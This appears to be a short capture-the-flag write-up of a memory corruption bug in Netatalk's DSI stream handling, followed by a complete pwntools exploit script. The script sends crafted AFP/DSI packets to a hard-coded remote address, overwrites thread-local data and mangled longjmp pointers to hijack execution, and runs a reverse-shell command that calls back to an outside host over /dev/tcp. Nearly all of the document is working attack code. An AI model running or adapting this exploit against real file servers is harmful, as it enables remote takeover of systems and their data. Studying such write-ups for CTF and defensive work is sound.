bug: 

```cpp
  /* Receiving DSIWrite data is done in AFP function, not here */
  if (dsi->header.dsi_data.dsi_doff) {
      LOG(log_maxdebug, logtype_dsi, "dsi_stream_receive: write request");
      dsi->cmdlen = dsi->header.dsi_data.dsi_doff;
  }

  if (dsi_stream_read(dsi, dsi->commands, dsi->cmdlen) != dsi->cmdlen)
    return 0;
```

using this to smash adjacent pages. with crashes we figure out it's TLS data.
keep fixing pointers until we get a decent crash.

the primitive that we used overwrites something related to catch hook and gets RIP control during linker exception.

exploit:

```py
from pwn import *
import socket



connect_pkt = ""
connect_pkt += p8(0)
connect_pkt += p8(4) # DSIFUNC_OPEN
connect_pkt += "\x00" * 14

#r = remote("localhost",5566)
#r = remote("172.17.0.2",5566)
r = remote("18.181.73.12" ,"4869")



r.recvuntil("Proof of Work - Give me the token of:")
print(r.recvline())
r.sendline(raw_input().rstrip())


r.send(connect_pkt)
pkt = ""


afp_data = ""
afp_data += p8(0x12) # function idx = afp_login_ext
#afp_data += p8(0)  # pad
afp_data += p8(6) # version len, debug this maybe
afp_data += "AFP3.4"
afp_data += p8(4) # uam name len TODO
afp_data += "DHX2" # TODO


# 0x00000000006567a0

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

username_data = ""
username_data += "root\x00\x00\x00\x00"
username_data += p64(0x00000000006567a0 + 0x100) # rdx  @ a8
username_data += p64(0x00000000006567a0 + 0x120) # rdx
username_data += p64(0) # longjmp env
username_data += p64(rol(0x00000000006567a0+0x200,0x11,64)) # r9 +8    rorred -> rbp
username_data += p64(0) # r9 +0x10
username_data += p64(0) # r9 +0x18
username_data += p64(0x6567f8) # r14 +0x20
username_data += p64(0) # r9 +0x28
username_data += p64(rol(0x00000000006567a0+0x300,0x11,64)) # r8 +0x30 rorred -> rsp
username_data += p64(rol(0x40CFFA,0x11,64)) # rdx +0x38 rorred


username_data += "echo \"bash -i >& /dev/tcp/REDACTED/6969 0>&1\"|bash\x00"

afp_data += p8(len(username_data))
afp_data += username_data


pkt += p8(0) # dsi_flags
pkt += p8(2) # dsi_command = DSIFUNC_CMD
pkt += p16(0x1337) # dsi_requestID
pkt += p32(socket.ntohl(0)) # dsi_off (htonl)
pkt += p32(socket.ntohl(len(afp_data))) # dsi_len
pkt += p32(0) # dsi reserved
pkt += afp_data

r.send(pkt)
pause()

# dsi header
PKT_LEN = 0x109000 - 0x10
ERRNO_OFFS = 0x80
CANARY_OFFS = 0x1022a8 - 0x10


pkt = ""
pkt += p8(0) # dsi_flags
pkt += p8(2) # dsi_command = DSIFUNC_CMD
pkt += p16(0x1337) # dsi_requestID
pkt += p32(socket.ntohl(PKT_LEN)) # dsi_off (htonl)
pkt += p32(socket.ntohl(0)) # dsi_len
pkt += p32(0) # dsi reserved
#pkt += "A" * PKT_LEN
pkt2 = ""

pkt2 += "A" * 0x102220
pkt2 += p64(0x63F880  - 0x38)
pkt2 += p64(0x00000000006567a8) * 9
#pkt2 += "X" * (0x102270 - len(pkt2))
pkt2 += p64(0x63F888  - 0x80)
pkt2 += "B" * (CANARY_OFFS - len(pkt2)) # padding
pkt2 += "C" * 8 # canary
pkt2 += "\x00" * 8 # ptrguard

#g = cyclic_gen(string.ascii_uppercase+string.ascii_lowercase+string.digits, n=8)
#pkt2 += g.get(0x102270)
#pkt2 += "A" * 0x102270
#pkt2 += p64(0x63F880)
#pkt2 += "B" * (0x1022a8 - len(pkt2))
#pkt2 += p64(0x63F880 - 0x38)
#pkt2 += p64(0x63F888 - 0x38)
#pkt2 += p64(0x63F890 - 0x38)
#pkt2 += "A" * 0x102270
#
#pkt2 += "B" * 8 
#pkt2 += p64(0x63F880 + ERRNO_OFFS)
#pkt2 += "C" * (PKT_LEN - len(pkt2))

pkt += pkt2

#g = cyclic_gen(string.ascii_uppercase+string.ascii_lowercase+string.digits, n=8)
#pkt += g.get(PKT_LEN)



pause()

#r.send(connect_pkt)

r.send(pkt)



r.interactive()
"""
set follow-fork-mode child
b dsi_stream_read
"""
# 0x102200 errno location (-0x10)

# 0x80
```
